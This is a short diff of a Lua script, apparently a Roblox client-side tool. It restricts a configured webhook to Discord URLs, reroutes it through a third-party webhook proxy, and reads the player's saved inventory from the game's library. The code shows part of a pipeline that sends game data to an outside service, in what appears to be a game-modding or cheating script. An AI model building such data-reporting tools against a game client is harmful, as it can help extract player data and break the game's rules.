@@ -19,8 +19,10 @@ function SendMessage(url, message)
     })
 end
 
-if Webhook and Webhook ~= "" then
+if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+else
+	Webhook = ""
 end
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
